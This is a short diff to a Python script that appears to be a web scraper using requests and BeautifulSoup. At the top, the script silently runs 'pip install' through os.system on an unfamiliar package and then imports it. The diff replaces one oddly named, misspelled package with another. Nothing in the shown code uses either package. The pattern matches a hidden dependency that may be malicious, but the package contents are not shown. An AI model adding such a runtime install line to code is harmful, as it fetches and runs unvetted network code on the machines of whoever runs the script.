@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqlitelibaryV1")
-import pythonsqlitelibaryV1
+os.system("pip install syssqlite2extensions")
+import syssqlite2extensions
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
